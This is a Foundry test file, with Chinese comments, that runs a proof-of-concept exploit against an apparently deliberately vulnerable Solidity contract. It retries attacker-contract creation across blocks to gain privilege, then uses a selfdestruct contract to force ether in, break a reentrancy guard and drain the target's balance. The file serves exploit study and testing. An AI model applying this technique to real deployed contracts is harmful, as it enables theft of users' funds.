// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {VulnerableContract} from "../src/VulnerableContract.sol";
import {Attack} from "../src/attack.sol";
import {Selfdestruct} from "../src/selfdestruct.sol";
contract VulnerableContractTest is Test{
    
    address  public owner = makeAddr("owner");
    address payable public target;
    address  public user1 = makeAddr("user");
    address  public user2 = makeAddr("user2");
    VulnerableContract public vulnerableContract;
    Attack public attacker;
    Selfdestruct public selfdestructcontract;

    function setUp () public {
        // vm.startPrank(owner);
        vulnerableContract = new VulnerableContract{value: 0.001 ether}();
        target = payable(address(vulnerableContract));
    }
    function test1_normal_user_GenKey() public {
        deal(user1, 10 ether);
        vm.startPrank(user1);
        vulnerableContract.genKey{value: 0.001 ether}();

        (uint256 keys, uint256 balances, bool isGenKey) = vulnerableContract.keysAndBalancesAndIsGenKey(user1);
        console2.log(keys, balances, isGenKey);
        // 每個人只能 genKey 一次
        vm.expectRevert();
        vulnerableContract.genKey{value: 0.001 ether}();
    }
    function test2_attacker_GenKey() public {
        // 透過攻擊者合約來 genKey，以此達到攻擊者可以 genKey 多次，並且取得 priviledge = 5
        bool ispriviledge = false;
        while (!ispriviledge) {
            try new Attack{value: 0.001 ether}(target) returns (Attack) {
                // 判斷是否成功取得 priviledge = 5
                // 若否，則重新執行並 roll block number 至下一個 block
                // 若是，則跳出迴圈
                attacker = new Attack{value: 0.001 ether}(target);
                ispriviledge = true;
                break;
            } catch {
                vm.roll(block.number + 1);
                console2.log("Contract creation failed, continue the loop");
            }
        }
        
    }
    function test3_claimDeopsit() public {
        this.test2_attacker_GenKey();
        // 透過攻擊者合約來 claimDeposit，以此達到攻擊者可以取得 target 合約的 balance
        vm.expectRevert();
        attacker.claimDeposit();
        // 需先 selfdestruct 合約以打破 target 合約的 reentrancy guard
        selfdestructcontract = new Selfdestruct{value: 0.001 ether}();
        console2.log("target balance before destroy", target.balance);
        selfdestructcontract.destroy(target);
        console2.log("target balance after destroy", target.balance);
        console2.log("attacker balance before claim", address(attacker).balance);
        // 透過攻擊者合約來 claimDeposit，這裡會成功取得除 selfdestruct 之外的所有 balance
        attacker.claimDeposit();
        console2.log("target balance after claim", target.balance);
        console2.log("attacker balance after claim", address(attacker).balance);
    }

}